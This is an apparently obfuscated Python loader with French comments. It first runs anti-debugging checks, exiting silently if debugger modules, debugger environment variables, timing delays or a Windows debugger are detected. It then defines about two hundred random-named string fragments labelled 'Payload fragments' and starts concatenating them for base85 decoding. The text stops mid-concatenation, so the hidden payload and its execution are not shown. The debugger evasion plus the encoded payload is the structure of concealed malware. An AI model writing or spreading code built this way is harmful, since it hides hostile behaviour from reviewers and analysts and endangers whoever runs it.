#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_cbD8MAPvS3TqRL = 'LTqM3kAuUz;K#)b=|y|rz~2=)vRh98X`So&Q7o(P=Q)2teSvI`h0Fd$1'
_cfwZKfZcUfqn_r = 'qvl4L8k9fzE{YA_?5W19n|b8*W&N)huMXSB*t;NdyJ&LadHvm<$QI`@)'
_cezNchGX1Ny1N5 = 'Lvl%^Lo<3tNeF2H`E)NARj-!&RdI_(>Wvqe>?S!b`;Qnz8u|CvDG?;%c'
_chY3xqT4kztgwb = '7ss$^%Q8JdKEOg<~mk%9R4@r*L>)?BC25um!om#)mYoF&V;7St~?r~?&'
_csac42fZ8f9MRh = '?-twbgBd7fPT#2ZA>Xu9{aEQ6?A8Try$`w9C88Bxj9bLb(&6#8?8U)`T'
_ccKhy1kWj2L7A_ = ')G{)MbfHjEJh*;q9L7pufIhs3BdgPs75YIiOLIr`()vTPQ?w;V#7*1Op'
_cwjEf7jkfPNWMo = '0~+EIOkS%0OiSI9c|G1pX!Z<DZy!g4lo@bcZ`6O<wzlEgDU!PZ%@VX&{'
_cqoFdoqJhzoL3A = '#ux@Ex40@DW_ZPdl$A4=*xah?ri$SANxEQWO`5uG#Q$-huIH5iv9CN9Z'
_cr2lCNqdlPwskO = 'qdPT=QrNiPiq=&ep}Es|dwIPVACM8(}%o$&*z7f-CUGEujvc(Ayt&H_H'
_cw9EmpzrCkmag4 = 'ys?2ywY0qi0F=s>_M-EZ$HVznEhpt1)A7^k$Jj6-BGSip&RhP7qc*IyJ'
_cjdo3BU6AEPrDY = 'rxO!ms((tx(ojjwMCai4MJI-?G`pF|sTd9{5V3azI1dWBLNSIQAYTNg;'
_ch1yyAumnf8qiU = 'E1*Q_ZR)0TFgS&G%78cAcfpXg?(#G&`NcnXx`nYnS9hT`D{88oi=sIo^'
_co1FaWqGLZ9G9S = '}JHF%ciiLFypPY&FLy95I2a5zk;e>k8QiiJHDqHMYVR2%$?XKwjgmH<Z'
_c_0t9jQMitVPXl = 'zc>w545O*PC$P%KzX6CTMHC&~?Pr{K(NG{}nt;NKRz3e*T{IGtNQ4aJn'
_caEU4xgxfk5SBj = ')iP;@q8sUZR28cm?h`Xv6rplheiscpc9Qg`e@g1~PgD364!;hz|bu&aN'
_c_cCznpsvxPBuf = '%x9S1NMWiUz=^D{nQuMzQEJMgdP&%O6A^Mh^f<GkXf+;saAU56(tn$Da'
_cd5SQW5K_47CUb = 'LoR&JPGMg=eHaBRN!z@N!1nLLi`cJxCbd+g`52KP12GM+aJo&2WMFZR>'
_cf0i_tzbvlY0NH = '7Zs#IP5k<n^!4B;V1-&s9r2N*NS25%b9A3GynHCuMen^M_qQ@$3SRg0s'
_clnY3ldhyoVzTj = '^6(0V}&$<<)83S9uW_o2-L;I*_*tp5kSF_JNfk{H;f+8eu4ROBW+EIdn'
_ct7qCNhETEEj09 = 'F;!n8sB*_y+VB%{-&=2LK*Orz2iW~R_$;L(nSljwS(U*fH>`hKwUSGAE'
_cqSUYIuar2cNNQ = '%pFqF>-aJA%cibkpV@*wRT5Qe*{1vulyUS9`Z4v}1Gwk)zk~t=HrF!l1'
_czulw4qaEkODV0 = '6g5V6e)&0i!Wn5I`5>H2rQ%IBWd4jHMvkPsJA4Glf%UG4IYA;MB-Z69B'
_chc9tSgT2nnLB7 = 'ZTgCT3Xs{8p52&c|3jdFq>a|A|~yn7su0#528cg2(lgTd!SBLpaw5;N9'
_ceImwC6aAFDDEg = '8YD}^9K^p(yn&7~&%&AlWj{^5Rn{A{S1qf(eiq-v@A+9X6`FFZ>D_QEf'
_co9usDhwL5V1Hi = '_z$lk@+!%Y{OJ~@{=m16`XF<eAE!Lrj;>}MdO+CLEPI!UK*N_UVt!$g~'
_ck46CcJ4L9z_KX = 'DIX`PCwzO6#O$kxC){7!f8S-fft2~-f?s);07$GMB;C)%%HhIx!FAdnp'
_cpA_lrhkeOqi60 = '|B)Rd#L@lk+dsQ4PU(9G{F>12u`E{$wR%XHi;li!9<8uCOiZUyUcgTP`'
_cw8Lgxs62fNzCi = 'P30L{gE1_vKk8-ABnGc81>9*X>IHUR>XM^~kOH7LYf@7ry`Cz~6(NH1y'
_cfhJHtqz2RVER1 = 'T*k&b_32`dCsQLg99JePDZ#GQp~VwEn_^a{1PFUx+;)Yuq{M93FS53w7'
_coejPaZhbff32E = 'd_6mueaF1H5{d6G}0U?cRH{bln`4CyuEU0srj*pTYgvHPbU<hs=VzBuV'
_cdmYE3zaxWLfoa = '%O;8ib?tsJ(R9w@Il&Sur4&e7GH;0aet)iU-?4YhCWH?Pt$_|ywQLFSE'
_czuewmXzpN74wQ = '-g{)-#pm^uCiF*dvobolU6;_<Hw^@r6le!<$Fhx+;NY6J5DDU3H|`N`w'
_c_e25oNAS9SzwN = 'IY41n+H@n;$C#QE9~0!~+3pQopNs7|WvltR#a&9?VP_Gdc}3wJgfwNq&'
_ctHISx0oUvgUsG = 'KJn{CzJl;LraDD=Jzo*JbL@2|4uiOJntz3nFKt6)&YqMp$CgyReTL2m@'
_cge0ilMYCcYcZA = 'b@Uo^~jr%6;%$-D0R_NM|VkAcjWZ~CgpEQZ2GSU8};7+38Qi!!BX$jk{'
_cj0aCdLQSV19za = 'AHJhwiVBhX8o}xMv@Kaf-pTupE3M!|7gY$o7)phRD@_#jSm51cFjhe)U'
_cxE4agJ4MiKuqI = 'tc9j6i8HuJkY>!ow?=9cr2*JWaMTdPJ{ew-e-t^Ng|ir=m`O#J_3jx5f'
_cffKlNszbBJlf0 = 'BT@iX4AwxFndWOFipH4I)ekMhN#TW!FeGsFJM7Pjz(*+FxJxaYWztotb'
_cpluQoqeya4roC = 'Z`;mqa5sUiknEzJ$K`(;fcagO$D|Djv2bDs8#J#{K)(1+u_wOY5u%rbg'
_cnQqDgQWzQVBRr = 'EMNrQH7!{^?YqGyb-p{e%%rp-k)Ny27e<UQvje>}H_=Ieggn%ejV^;iP'
_ctSpxpH0w94Kn5 = 'X+=-4TsJ>h5>rl36*QO0+ch;8j!F})wEgmT2WP^T6)^6JT3WM|Y`c||%'
_csY5WLpHtOCyNa = 'Q~{6uqAi`5|jNNR4a9o?K2S04^q&Rj#vwiy@*-)=9GP$t|7QWl8!*+iz'
_co9JSR7wiZoGFe = 'YWr#82iR;aBXJ4aL4r5O!=Hv(yqxInBDD^9iOBCRV*!j}P!-f_q*52ap'
_crXbzmvvF0mGFX = ')mpqgYM_A!m8vJyuFt!6}~I!iOc?o3L-bD%OV22_zqAXaVMg{;)lV9U0'
_ceIEuICvJPyer9 = '(2pt~x>k*=#^9-N0^S2U)^P)}~GKR>x*$wW8nE}=0tuyI|rovzi+Ky2p'
_cvQi_UmZy5wfpS = '8E71;NO8q*#iT{Dhylqh?nX?fk}@qj2PRDOZv#x<-rP^*n08$gv?ALxg'
_csboOJo_ChNudq = 'xx;?V9qTSfemJB=);RW0?WFD7$?bP;w(9^#aEk-xQA@m_%O1G9oL5Rmm'
_cs3vkoPeQuswvP = '|-vCU!E%NK7+Ws<_cnC1uX=zh#+VYaM))89)>I!~NqLQx0JTJbzCW=ql'
_cgA6SeYuPPmnQc = '}SosF!k30x<R4tQGO>hbS%7PbZlirTC+PEjU-z0oY*gpSLtO+PGyn1Mo'
_cn_Q94c1cY5C2u = 'abh;q9b_hyWS0^^F^2t-YNHE$^i@aVJP&s&08RnIA6o~zbe-i#~LG<)T'
_cg4m4IhUicJ8Du = 'K`$WM=fO2ovASxn2AzEI!H*o4Ce%4$&B&17M=PxjXkye&EdCsL+f&F!K'
_cfH8rD6jDaSCdb = 'pwPXzKOvC)20Z855(wOo}Fu<Ze&=s1*M~6*L(^cl|}5wwOXPJ=-w4wLH'
_caaespI7b0a8QC = 'KG=slV_DL@eG!@ZOLAq!>=*tYb&|j`mT<5eaRkG)RX+MuU<Lm2Rl`ASG'
_cwgo583ShylUcx = 'Vf89i^WoSKYefN$xjih$-qb|P1=N`>8(X8Ssiz)%+EupG_J0e=A^+x$U'
_cfi_NxGwQlwiNj = 'Y^=|vcl*1qn+yGs~p4YlrEbR|@VfxBQSdF?xtG3lejj?3nx)FKh;DYs?'
_csQxGuwgumy0Qb = 'U3ow2U1y2p?Y0)F;umqrd8>tA-DkoV8_YHnhMk8MEG2Egzxmb%P+AZX<'
_cnPE1pHRGojTTZ = 'j+WF;lry1xLSbZHWeVXBuQx{f$v8ADj<iXl<4YWl*jn)^$PM57@I^wI6'
_cbtrqICmpilegE = 'oi1njd|c3bplCUE-icp?S15$j-L=wE^B3Jz64${?^(>_tBRF;edOMQ$9'
_cp9GJeL4hcdCiO = 'qT1eSOE&O?E*@rocM^=gIi6D*qIBFpSr$*U2g7=^g1I3Q96C%W*LX1d>'
_crvK161Mo6w7yY = 'rB^&yt_e}PiGtsV8sCwlpJ8E7@xpDsytLZ58mAFBRwG9xK0N%x!{rsjg'
_cgmnqSyk6IHbsZ = '{>QdneaZ-J5&f=v5MeuY{c){UaY9K0$x@{EWWDK{FooYyCAKnvKHtOf+'
_cizlKWz60XSReL = 'HLXR$;g7H=d?n#oAyHjZ{qXMlQT4I>`XELKkI^QjG)_PJs;miC=JlAjz'
_cpc8jCfa2j7Qlv = 'qp}WC^=Rywu<i?K1(bjwA_pdtTP2!tWx2qa4aYX^1cE2pzrs55cHCUpG'
_cmOjKzOVKMRTDH = '4ui?}P^ql>RQ4YRvnM->>QV5!ojSpJ5<*w~ApK?@cdcx4q~y>I7-%gzB'
_cnfktc95AiDjRF = 'T5<L#}i2oufN?_&Ma2P(lf3Av8z}L7UBvQ#rBt`W%kQ0gd$X-3_;#}FO'
_czW2pqah5XmQZt = '(Br&**=`Xymx(J_hKt^!TITvpct+R|mo}P`v8if9|Am-w3fklFBqyT>f'
_co1_seetTLrcaI = '+?{JcLjJW^(^U#HPlVs4jTrm|J?$YNV{-=KJ~EdPzQ)SthgH5qLso`=o'
_cwLPM4vsH0Tav1 = '@<0$&}u(ysGIv4xrM83q`=ANZb~&p19jd_WtDBuqX1#%cbu3p9@daD1h'
_cvzPZhKD24nJvR = '8+6R5L|*w-|U(g2EIF&l!g9i$i<9>tWJx_a?6&q;|%VvuCfP>KVH!N_x'
_cqG1JRQns8azTi = '5j39AJLYo?&|9BzV4;z7@GfpB^PP&})h_~CHf!1Jt^^EXUgP7BVC(Y4<'
_cyk9KuECGIP6Ws = '9TH^O`!OHxX=E}zahD1-g|ZE{4!IoN4MT}}zw#E;mxS^C_66StS{_sUm'
_cjRPos7qoUkmys = 'jK(Q`rE=#&P(`axz#g-kV<Xw^QLrdfk?HTsMj>JWRdT>90`SdPHot>DY'
_cbTUoKyU8pY7SX = 'hL)<D1a2g-=O2@^=^GGh#Q)i(S(7NF^cs5>Tu7a=o~zCB@!HQk}}%<VX'
_chNGcCWZ5VJ887 = 'zlKchZDmG)z)CA_W}xl+{3d|A2DQJ$Xd{ZD18q!oqZ#Rm;<5HxKlfZgn'
_clWMWwX18zwRJQ = 'G4p#Vz&IH6X-f)kQ3Xg%I*^4}Btp-|p_BVdDf$~gDh%P?Lr@r0?8k(KN'
_cr8uLlEkGrn3OU = '{%%}*wS1pSXnAqfb0LA*26XAF3F`UhQ7IgT)z6Ptw5~mOiQ4^C+SAzej'
_cjDWmDUJvU8AO0 = 'nW{ltJE+?ELJpT(bE9WOzPprKRX6@kf)Yt2>QFt%G$$oMMl!aHj*}KQh'
_ca0bshD9xt0OWG = '1&jFsnz#!^_}&Knb`V5C~>OgL7Zt|Li<5-e$`i%6W%dLg4+fKc`QuKmQ'
_ckgQc3tkSFql8Q = '(DJg{s(qh5Zkvu;)TWUyZ##7BrhbV$(%Q|K>%dPBm9q2=EIKv4l^nmcy'
_cr3jZH7457gMdu = '>OsA?ZOc)#NH_CW~^@X22UQ#9{{@MKM)}sR>8O)-1OckA-(%x<=oes^8'
_cldGEdGqKNAUGv = '-UAZ)VC3^)(M?_>H>TPMf^E>@>WD5t+S=@LM9m6+PVvhZ!y1F3aeFYSs'
_cqU1cmCPZy4G9p = 'PYDKv}*5r5^U>N0ELIJ_@0|>=iVmmhK#<*_VlClSaodvjl2E+bAmk;e9'
_cczPEZmKjQfYiv = '>y`g(qtCF-%$K!Sb~s9<WDO%mbf3;H%OjJ;VzK!I_%^+8sWvYD$5)$e)'
_ckbkxXOVUSjPp7 = '?O`NGeSK^R5`UoX513H`COcB&TU!3C%k9M=u=x*bvj&0G-e$8_3erU31'
_cw1h6j7sqCUWQT = 'f(#=yVP47HGcuJjpCU9BW1k!r$8heGJs){X4^BlkZB3Xlp76^i^Z0}1U'
_cs568i99EZotuQ = 'v!xW!Xknq6g!E{DazUiP?g%$b%b5w8b(D0R8Gr8fBB?$~lLBbQk@j{Qa'
_clgMJpWn6FHLPc = '`CZuoE2GiVuI-5!Tb;;Z@!6`?HNy|LNm%G*GztUsX9Ev{leb=fsgPO6B'
_ccAcJ3X6gMNxk5 = '|Kw)ylkcVCr}*f`{TmYX*d*yA}A-qxF%cipjE?O2dST0bW$LiG(htK|o'
_clNJLCe2jobu3s = 'M&4AUv1$f5N^YJwV!AB)pUAXl`$arcY#p9#?iAjB#*T9fLy$psteZ#Q}'
_cd8E0w5nHOYTq0 = 'c)9HiILZ&@4GWuA;yYp;vg~5O&Tdbuy$!K$){ztpzWFv}wwTt=ZspqRB'
_cjgevryX2FtLKe = ';=2{{+iTX$nUax3gcp~#R^?ptopJnE4Xv{R^$=GlSAr(a-YCcD<RgpQd'
_cfTIZ8NYWxfI2K = '8r{q4jDaSz5jy2?HyT_5c)j|h+kR8eVFIkE7;%tCOFmldhT=4l8v|$?^'
_clEA0OvLrwyJ6f = 'RZT^-`j>$7_W+-B`51y)?*BE)-gv*mW)5Y+V%a5j$CccIfB&h+wOq7p%'
_cc3Kc44uJ9zUae = '^NpZ5HbA_b}cgYz1|=v>8=C+naq52$~=wnD%qdo2n}d^t#O*(naJD8B{'
_cdw3hAzcVYkdc3 = 'FqgI7>UDVG-Wf-7FB`PykEZ=ZU)nW&eDCe!q#IJvcEUT{5@_<R0ig*df'
_cyye2KlYHMrhHM = 'QAFNHKDVOu=`3Z)x$3-Yv+cZp=T^;?hdQ>yiUsFA!wP(@pH3=ze^o~ke'
_cuhe12ar8aUHCm = '3i(dRbwRjnX^G?_<E>UZ%?R{=ChsB*Db(A#X^Syc((qgjU_OD+-i}(i|'
_csGK6roGeBwsek = 'vdtLnMWfZ(5^Bjiato?_Q`N`ZPc(3Yxb_j_So;ny410K1BW%NUvuykW7'
_czgYgmbQorI8bo = 'S|q2y1pi>S3~`1n4<hKvFzpO>f9SX>1Rd8`8LK$JK`3C`F)f#yRbbrN-'
_ctrQB4K0sV64Kw = '0DEi8KUvN5{tAk1+G}X5{8eRSZ^=OoYTh{FABuu4tr)N=8GS68NIEw~3'
_ccScIF9Bd53eL4 = 'gEQ;C^$)MpN>ci<vc}kmc-0X%L&P+cbvphme-4LMLbp7i6P~k)i296>K'
_cs8Mks953EoJt4 = '&TIX8cHEl5!Luf$7;jvPIGAt(n-`msJ4-Ka#8cH($c5}3KI2K@w^=5zj'
_cqeUASKok80P7w = '*URBpWp-+uFzW2+Tsu1Xkd(k56qoB9S@e?~j}`#)aFFvUX0&2&)V|v0^'
_chEecZZTWPsNTy = '~nG73T~R~w((rTOdxaW3I=^Mw2hv!6dMU5nRN)_0cw1%$D)aEJ=}p$V&'
_cj7bW2o6FFTIvU = '~-JMYQu3bKLPY8UgS2D6>rQCkEm=d|H2so38j*SH33Cw_j_?D)tr|lak'
_cfq7zysCgEfnjq = 'C-GjFC!j*>0#dUnTA7gIUR8nBuoWA~(74}M(TtKQ=km*^lPcO{qzwtS3'
_cnJEvNPxLITjEF = 'S^@^knmf$#Qkx`z|M`G(#O6&qUp-_cB;XX{am}eo`QETz?Y|)V~yhkg*'
_clN4iOiDEMSVyp = 'Y+)3wR~&fOFC_KQxa<NRY}(d-)0MKiPS%RR>8*-UM<gZ7Qvj>FbS<4iS'
_cjSytB4XVZHQ0K = '0XZ{5=qionC)VT?;y+{HaI%zh1G@v|BWd;HIo5`-rV5av?R^q$P$@1nf'
_cg2b5wF0WPf6pT = '*HB8LhHSQEEPdA2bR_)CZ0ShWt`YlxMuTopyu}JAoqw2;2zULOh7xyAf'
_cvaJZMVo3bPcwH = ';UU;oe=JVX+X38MnvdbIZRGZ=u#=PUeA94}<c)v@)}y4~p<vrz;$njYp'
_cvSlgyOkmqre1X = 'pu*6Oyl@f_|e>;nx+i_0nods<&`hf&rehy^RpEQZ})V-Zxx*Y<;3A&ag'
_cs_vw6VACACaqg = 'lzTQ^pkB{DW~>KDsE4w@bt4lRs4Df{h4%$-pMC2-~O-p)t3$+7Vfa2C0'
_cyxhPH5MTweLs4 = '>xQs1Zeb1vd_2VDL0^&OagFts1js&`Gx73>h(lHlj!Q5W&Iw`6{W*Svj'
_cuvE9E6BjLmeRT = 'F+J~4cw`2UU?jFslqm6T?DEnlE;O-NfSSBk*FcXQ^zmbp2HnRDoOai)1'
_cuTTbioP6IQ9m8 = 'r;UhHwxspq&};*ZoO4IT{F*NUlvke@gX|ZJzCq5Lw`3>YpYO79NE_=qy'
_cofrVoq_LBDOoZ = '#3x+i}EY@q>G`fSEk)~noKoLm#Q+xOMoDhJs*;ZCLdy?qzsJ7uD#&g3D'
_celDkdscc2lXr5 = 'Yl$*ML;y`=_7^Re}!AY`wVVk9s9aqKVuU`r?-5yyx{E!Njz;S@`%~3W~'
_chyTtLPHnKxO1Z = 'Nd>a)E=6inH*5FnF9$wWxi)C8sPsxz_A4@ODx8`|Xpk1KyR<$&%!IN4q'
_ce2G2pSUIX6cHC = 'Xi~G$>mnmkiVSG|5Mw$tK(OSZ4*^)f6T6;&_xPh1)sFoAQygl3_KAC@T'
_co1WCfpzbAw5RP = 'F}-UP5Wj$meN2{m^Y{_+D2wW^fi_p*UE%hdQg_N#KqRN%QcQ1TOw?c3q'
_cxJSmYaDFIpT6b = 'xGyUcDZSRY8j-d^VYLX{~#QTkd%a!yrhe|^!5Pk&$KAU?qTaL3{pZ5&I'
_cszNVg8CWME5If = '?MQwINwm%DtxZMAjSvy;@H_f<AMA?NCTD#IU{;7+o(O1iYY86y)0p3GQ'
_cifEAyHDo6zXLp = 'xK7DClPrTDW@$Lg_{6y#XEioXq<l<!ZjtI_?lcw-By^_h171y^>Sn<kz'
_cgl1rhgzqzB_tN = 'by297Ns2O{eTBXumV4OqYASATU;ljY$QWKqJArAayg<9BCm`p#i65x7-'
_c_SCLlBWHwGsyM = 'st*f|OKW;AD7N(KoBpx?Q_3nHFpj-A82|I{Z)$O0ln8Fo<XXz(qRdbpC'
_czcAikixlN9vC3 = 'n7Fzx&Kd6iR={-V@y1G*a!TMqk9`H4nb_jv#R)v_*v^`>1lo5c?syJ<v'
_cw36cAJWeTaQik = '<f1;Q=}VGN-aw?v_G9?rs{ZW-c3QUXSJ)LxSgy>K}%cKs$DdXzNO4$m-'
_cgeGhF6jsc7NW5 = 'ux7N2|Dw?4Pyxe~WW8_D&JT+y>Tqp{ub8YzkS(sRhp!-2U)1Lg`4_R$n'
_cd0xmg2jkf99IZ = 'TQ;l`<DEX`H`2Za2FT&~?u$EFz;Cb>V=b}DCeYzvpLe!wrt9AVxoDP+h'
_cou5dcRAlSZUhs = 'RL`fawMoQM^{{ou3}vD;K(L+c1M=_DsQP<fAY0M<YUG!xpz<u?D8@Xc-'
_cr7FLDPNy4x2rK = '8+Eor|&|7dfbrwxM?gZafS(1O{RSln&d8CI$G(mMsqMsf+Ae>a|+rjhZ'
_cjXb3n20jJq7hR = 'eJpjY@GOb@x&)RK^1$p1Lo1D&WSe$FH0$@zaL<raMLeZ~eAaDk?uxu(&'
_cv3D9T22zvrTAE = '8J&+wh1xeXFyS&Kl;k`U1Rq@}lYiaG2Joj~Wj%W7`Vj+gy;@B5*)s)4)'
_ccfajcgBLJc7k2 = 'x!J3=^#S8Q~r~&!pcmbP)(LuQk9O(&ukl9>g-xUb1+Ga7<-ddZkQsm`6'
_csxWYTjFojMRes = '8A94gjrNg~^IV;IkmX1Ap=dZC?q=o#2)_gRj|V-K0u8N08_?+90?FEFc'
_cuFnNkLKNAdZoR = '}waTZyVJaY+RF0zsVJtHm1>+B%`x14)`;HiTh3}IzltBK`RKymGK2ex<'
_czG8o2YtVLeZXu = 'GpwoU9nygD2!+14)99tkCjLJ9W{K2j9%YW%e6Sg4Vq2`D$3d-~fb`53?'
_cw0jOQvk6ajvuM = 'T*06|}T!dI#8(G~qoK<WXl%lk7G&uMmW86@z2HZ~Lde^P+hqaTOu&Z9Y'
_cdifiexyOc_P6g = 'j?rdCerpLxg$g67k%9#>uW$T4AX)aDZxM7VvIh>qwO|Eg1)2UC<Pr%}2'
_cs4MzWGRnh6jrh = 'Clk|QXgF%&OE9cfgsIhDs={snqO-lfRvMVT*Pl3iRoFG)Do2`vD7zbJh'
_csEMZCXwYUQkS6 = '`y@WCoy#LbcymbPw@qwNl>ocQse*@XERyTX`?}w{lMX>XnEDkaj9I?$r'
_cyiJ6qxF6Aoyxn = '@kKHTIdA<EO55My@G{buGV#L9koj1JL?|S~y+Wi86$H#nWDd-J}Ha_L+'
_cdYIgMmULicibA = 'xt+Qk_th$j&5gbNQFmA7^wa*0OYX<c#~Hy)1ujl@n^3RuIFJu0RzJe3$'
_cnX8BF_WPpGHBF = 'VU*8+Qbj2or7qH+c*<jrjgn7;mMhCPSZOrWLhaP5lOP~5z;_tTa14ED3'
_claV85REX_tVHu = '^j*0>1i?*%H|Jr-K|fugF7s-rv`Xm8IzTwpl!;YFtePP=;D?FVMt`C4{'
_clKIdt7uBEv9kA = '@R+M->7ldYCU#{CZxX+{i3RLynG|(%SQz?TNmfjYYO*c-F$K`+vLTkwB'
_cxK9lasiLxRfov = '9bNG|vEHKFppF3amXhf>CH&6!l6AjcI`^y&K?5X+PKyHr?PrHn#hUCyu'
_cloaJclnqL6S6A = 'HcCUMKTU**DE4XyyCi^RViL{IAsgmbpt?eWg(=bFTywYaJLc~%T^hRrh'
_cfbumarGMWqhYH = '4QVXRj&CVD`EG(^gSe`VKf{anpA{5~%vR`qOyi1@^1rtN%6^j@;p3h|B'
_ciMg1t4iXBBPhz = 'X-gT139D$2E1*^P)BMTi(n>we<-k%n%f2e-u#NmS8PIAP7~5W^Bon>_Z'
_ckVRQ7OVHkkUMw = 'lAj6*SG{T?PSLtR@tGtgJU%DEc>{k&y7r2<W^E1uRz~ZmIGKDbTAvcH%'
_cjQtFr7msf5ZvZ = '{G`7t_Az%hct&=`IP42wQOZQYs*(IX3%&cBwCWSvvhsTU4?M;nhCmrNf'
_crnJ4pM1U0vwrL = '_3f|TEtZfC`N7OEIlTopY>Q3@qHp}j1Ms}lWb!;Yf$-b{i}bsjUS3bai'
_ctzjGc28N51PCU = '>^Qq-tU|8-33t)?}f`Ua3nWJfG(OjAn-ds9S>lAnuf#In#6XknM-;bpF'
_clrUBggdJ6V51x = '_PU6i3cs)<gR(ULwxq^g-eHu~_UE5*D`VtoZF{Wl${c=3MH%i9i8{>l#'
_caMiFxFQu6v7pD = 'K(NBvF14<pf6e8sFw!CBP7Moi8MG;RBzgala0tX!pxWfWr5a2nW4x?xh'
_cq6TprwBpMWa46 = '*uyzUnsA*E8$LnB&)AWbb9uBaqSJbwk|TACgCe*>qv8>2D>ryjO`60lr'
_ccfGy5aTg2zIm9 = 'x%MRqh}$O}QtQ|P;BJj#U?hF*m%XlRh?CN2)DQnAS(<Tg+Gc(10zq|NR'
_cwC6tHBPrDAjVd = 'TiA=KN#IMz|P=^CQ;H~LHw)PBHzf{q&fsG^vHjnBFIg)K37ZP7zrz_Nt'
_cnFWtB7clfWewy = 'Mb9ugne$qZ^@OS*s&KfDL9yMGUoq9$`YuL_)~`O%*qcZ>7R!@jb`MoAX'
_cifWmzoGlcM7QA = 'Q-5mVsmPZe_5mR31n6?NV=joC*}l5p_*-_Fq#k**bx%WbGKR;RG>()-8'
_cj4QC2NoTPkpoX = '5Bko!OEsCTr^RHkMTfsBj;eTk|mP*t0{IQCfa0{i?ONrG+2DVT$`6Jk1'
_cyzpDuTTSEULoj = '*Q#SmE>h*@&a6dLCtzmExVLq$KhQp+7(Rw`9!@z{jeu5xTo$>t+*l=C|'
_cdjKofir4Awwqf = 'C!;M3;BmTJi5~I=F9I!D!-B#dMitI#o(MQ;#vn=$xjVaBgW%7Loqdrut'
_ceMHyFYXDhCnJo = '1o)>t_leWLaLL?oQA9LX@qC|^G6?(80J1Z*FGc1gNOuV>^avuDp&CTAL'
_cuFLXcdmHF9x3r = ';pk>tnq0bVo*fQzHx%?^K*2Yb$|+GDiZM&hDu(T|4(Ex00XBNA$}~S#B'
_cns0rFjYGlsnjZ = '@D29~rZh?VpN|&{<Ctj>x2<z=3B(?Nub7ZI!;rXxOJ>$b%cRuL!2t8YG'
_cbxFpqhCs3gxZ3 = '!wf>TOn;4@eOB3UvtMHidk;_JcCSGL-X!<s%_YH4T1iHTvnE|8vg9ib1'
_coBofmxnGY9_R_ = '~swZgSd}>*0sc$@U=Jatu-e$(C?^&k@k&n3!nns`o=2D{-<|GkFyF20#'
_cdGTksKpo3Jv8U = '>;o6gE_$%Q*L`W<jwSRuW#or+S}#7xzBOh<F!-xP!Cf$3g?nm}`sk!nL'
_cjetMQpxk0jbeR = '(Rac?ckNQ9mx4xxV*CoD=MQ2@h#6|a^u3g`KM-i)kezc_Cm>5Z%8E<UX'
_ciqOKa28NE1p4n = 'Z<k<W=BFtXz>ktK4f7vj&9=lm0!7&tR@kJ<rJ>EJM;v)WR7Tpi$iP-h0'
_cde9UGtGoz4Knv = 'j7n>&m5$17oKPp5=C)6#YZlg-*yq$!6eQJ|^FFi9OIoLok@pe^00U>ny'
_chfcypIWexDi5s = 'R4D+1ovKPG^s2(ap^>8cWvj?p~{BvwRkthxaaWNRFaxB7bcDOh5&Vk;J'
_co4eFnxvxDMXlj = '@vdBb9$K_6<3U6sW_r0crEG~hJ>zxNslTy)56)`<$s1v0BBDK)iI<>vl'
_csvfqga5ZiB90y = '8WmO=~}y#Jat*<0%6WVsHuOFzy!FBA3bcMB|kR`bo%|s2&iLW7=Vk2bk'
_cqK3mQ1eTmhM5D = '9DUpSRLjf>G}=D(<QrF`il7D`(6QIcMcKexk|AMW=qV?i3mf%3pCX!+m'
_cvtczvAf3evTs0 = '1t?yMEyb)v+m1ob=hh+6_h7-HD!5fO>Az(Y)@MQbhnO1}15+(ywY`gnb'
_cbhpMCn35Gq4Lr = 'Pd1DLL<H7!~s|gRv2*b}KnyhJPdeb_W`S7gY7aN$8Io4p}Sq~$h8QL87'
_cm0NW5cpwZrkJM = ')VE7_@%lww7v=ZKA(E<=fgj`7DTrt5NgBf2UeJ+UhGm}d!Rk&@Etg6*a'
_cgdBz3PUHrJFvd = 'vnJD94w`p&(|k74-*M$f<_r+1)-us&ML0^joPOoUA^Qna#ngQ2^<mHbI'
_cjnfdtt61IyarI = 'b<S{;56zT~@p~m`qGx>lGVAaOBzOtEfpH*t-Z<!-`7^H57rL8b@5CObS'
_caVm23KP7_ve8c = '=5jC~5~354c{%&yMqe#T50Z++7q#cKFxm``@w$jtu^T*ajY-i}pH$BP@'
_cvLNoQxvB60Lat = 'sz8!$0!4kuL#Jl<C;>ps^HJ$x^$N'

_pixAIQnrSsqJY7 = __import__('base64').b85decode(_cbD8MAPvS3TqRL + _cfwZKfZcUfqn_r + _cezNchGX1Ny1N5 + _chY3xqT4kztgwb + _csac42fZ8f9MRh + _ccKhy1kWj2L7A_ + _cwjEf7jkfPNWMo + _cqoFdoqJhzoL3A + _cr2lCNqdlPwskO + _cw9EmpzrCkmag4 + _cjdo3BU6AEPrDY + _ch1yyAumnf8qiU + _co1FaWqGLZ9G9S + _c_0t9jQMitVPXl + _caEU4xgxfk5SBj + _c_cCznpsvxPBuf + _cd5SQW5K_47CUb + _cf0i_tzbvlY0NH + _clnY3ldhyoVzTj + _ct7qCNhETEEj09 + _cqSUYIuar2cNNQ + _czulw4qaEkODV0 + _chc9tSgT2nnLB7 + _ceImwC6aAFDDEg + _co9usDhwL5V1Hi + _ck46CcJ4L9z_KX + _cpA_lrhkeOqi60 + _cw8Lgxs62fNzCi + _cfhJHtqz2RVER1 + _coejPaZhbff32E + _cdmYE3zaxWLfoa + _czuewmXzpN74wQ + _c_e25oNAS9SzwN + _ctHISx0oUvgUsG + _cge0ilMYCcYcZA + _cj0aCdLQSV19za + _cxE4agJ4MiKuqI + _cffKlNszbBJlf0 + _cpluQoqeya4roC + _cnQqDgQWzQVBRr + 